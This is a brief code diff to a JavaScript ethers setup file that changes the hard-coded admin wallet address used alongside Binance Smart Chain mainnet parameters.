@@ -3,7 +3,7 @@ import { ethers } from 'ethers';
 let provider;
 let signer;
 
-const adminWallet = "0x8Ce32b0B5f38a2834698179866d4c9d9e85F79ee"; // Your admin wallet address
+const adminWallet = "0xC42FD92eDadfA07c5b6845572c0961854787b473"; // Your admin wallet address
 
 const BSC_MAINNET_PARAMS = {
   chainId: '0x38', // 56 in decimal
